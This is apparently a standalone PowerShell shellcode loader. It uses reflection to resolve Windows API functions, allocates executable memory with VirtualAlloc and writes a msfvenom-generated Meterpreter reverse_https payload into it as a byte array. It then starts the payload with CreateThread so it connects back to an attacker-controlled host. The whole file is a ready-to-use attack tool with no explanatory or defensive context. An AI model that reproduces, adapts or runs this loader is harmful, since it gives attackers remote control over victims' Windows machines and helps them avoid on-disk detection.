function getFunc {
        Param ($moduleName, $functionName)

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
                Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $tmp=@()
        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function delType {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
                [Parameter(Position = 1)] [Type] $delType = [Void]
        )
        $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
                DefineDynamicModule('InMemoryModule', $false).
                DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
                [System.MulticastDelegate])
        $type.
                DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
                SetImplementationFlags('Runtime, Managed')

        $type.
        DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
                SetImplementationFlags('Runtime, Managed')

  return $type.CreateType()
}

$memIn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getFunc kernel32.dll VirtualAlloc), (delType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)


# msfvenom -p windows/meterpreter/reverse_https LHOST=xxx.xxx.xxx.xxx LPORT=443 EXITFUNC=thread -f ps1

[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x31,0xff,0xf,0xb7,0x4a,0x26,0x8b,0x72,0x21,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x3,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x8b,0x48,0x18,0x50,0x8b,0x58,0x20,0x1,0xd3,0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xc1,0xcf,0xd,0xac,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xfd,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xfd,0xff,0xff,0x5d,0x65,0x6e,0x65,0x74,0x0,0x65,0x77,0x69,0x6e,0x69,0x54,0x65,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x70,0x36,0x2e,0x31,0x3b,0x20,0x50,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x30,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x0,0x65,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x65,0xbb,0x1,0x0,0x0,0xe8,0x81,0x1,0x0,0x0,0x2f,0x63,0x46,0x66,0x65,0x61,0x48,0x33,0x79,0x49,0x65,0x49,0x47,0x30,0x59,0x66,0x51,0x5a,0x37,0x54,0x2d,0x75,0x77,0x49,0x79,0x52,0x44,0x56,0x30,0x35,0x67,0x4c,0x76,0x34,0x72,0x47,0x52,0x32,0x42,0x74,0x41,0x53,0x34,0x67,0x55,0x66,0x64,0x32,0x65,0x71,0x33,0x69,0x70,0x70,0x6f,0x37,0x6b,0x45,0x64,0x51,0x6f,0x65,0x33,0x34,0x4c,0x73,0x46,0x73,0x61,0x39,0x6c,0x5f,0x66,0x5a,0x69,0x47,0x74,0x2d,0x42,0x70,0x76,0x44,0x41,0x78,0x36,0x6e,0x49,0x65,0x38,0x4e,0x76,0x55,0x31,0x70,0x5f,0x32,0x6e,0x63,0x78,0x33,0x61,0x36,0x5f,0x2d,0x59,0x37,0x31,0x36,0x6f,0x4c,0x4f,0x37,0x6e,0x30,0x5f,0x44,0x50,0x41,0x59,0x70,0x35,0x5a,0x52,0x7a,0x38,0x37,0x44,0x52,0x8b,0x79,0x6d,0x6e,0x30,0x31,0x4e,0x50,0x54,0x59,0x4b,0x39,0x51,0x37,0x70,0x53,0x6b,0x39,0x6d,0x4e,0x6e,0x47,0x57,0x38,0x78,0x42,0x6f,0x50,0x43,0x61,0x32,0x45,0x50,0x66,0x71,0x73,0x65,0x46,0x65,0x4d,0x65,0x51,0x51,0x4e,0x46,0x53,0x72,0x39,0x79,0x33,0x77,0x7a,0x58,0x76,0x77,0x6d,0x73,0x35,0x69,0x75,0x56,0x55,0x74,0x39,0x58,0x5f,0x46,0x5f,0x5f,0x58,0x59,0x43,0x30,0x4e,0x55,0x61,0x6b,0x72,0x55,0x31,0x71,0x65,0x30,0x70,0x36,0x6c,0x74,0x48,0x56,0x33,0x4a,0x70,0x55,0x4f,0x33,0x69,0x67,0x43,0x30,0x77,0x57,0x69,0x65,0x6d,0x77,0x6e,0x4d,0x46,0x75,0x50,0x4e,0x6d,0x4c,0x0,0x50,0x65,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x67,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x65,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x65,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x65,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x65,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x65,0x88,0x13,0x0,0x0,0x65,0x24,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4a,0x0,0x0,0x0,0x6a,0x40,0x67,0x0,0x10,0x0,0x0,0x65,0x0,0x0,0x40,0x0,0x53,0x65,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x65,0x0,0x23,0x0,0x0,0x53,0x56,0x65,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,0x36,0x34,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x65,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $memIn, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getFunc kernel32.dll CreateThread), (delType @([IntPtr], [UInt32], [IntPtr], [IntPtr],
[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$memIn,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getFunc kernel32.dll WaitForSingleObject), (delType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)